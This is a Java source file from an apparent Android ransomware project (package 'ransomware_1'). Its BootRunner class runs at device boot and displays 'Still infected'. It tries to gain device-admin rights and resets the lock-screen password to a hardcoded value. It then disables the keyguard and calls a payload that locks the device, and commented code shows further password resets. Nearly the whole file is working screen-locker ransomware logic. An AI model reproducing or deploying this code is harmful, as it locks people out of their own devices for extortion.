package projects.security.ransomware_1;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.SystemClock;
import android.view.WindowManager;
import android.widget.Toast;


public class BootRunner extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {


        final Context fc = context;
        final Handler h = new Handler();
        new Thread(new Runnable() {
            public void run() {
                h.post(new Runnable() {
                    public void run() {

                        Toast.makeText(fc, "Still infected", Toast.LENGTH_SHORT).show();


                        DevicePolicyManager dpm = (DevicePolicyManager) fc.getSystemService(Context.DEVICE_POLICY_SERVICE);

                        ComponentName compName = new ComponentName(fc, AdminPayload.class);

                        if (!dpm.isAdminActive(compName)) {
                            StartActivity sa = new StartActivity();
                            sa.attemptEscalate();

                        } else {
                            //change password on start up for testing - debug
                            dpm.resetPassword("securityrocks", 0);

                        }

                        KeyguardManager keyguardManager = (KeyguardManager) fc.getSystemService(Activity.KEYGUARD_SERVICE);
                        KeyguardManager.KeyguardLock lock = keyguardManager.newKeyguardLock(Activity.KEYGUARD_SERVICE);
                        lock.disableKeyguard();




                        /*dpm.resetPassword("", 0);

                        SystemClock.sleep(30000);
                        dpm.resetPassword("2222", 0);
                        */
                    }
                });

            }
        }).start();

        /*Intent locker_intent = new Intent(context, LockerService.class);
        context.startService(locker_intent);
        */

        AdminPayload.beginLock(context, null, null, 0, "LOCK");
    }
}
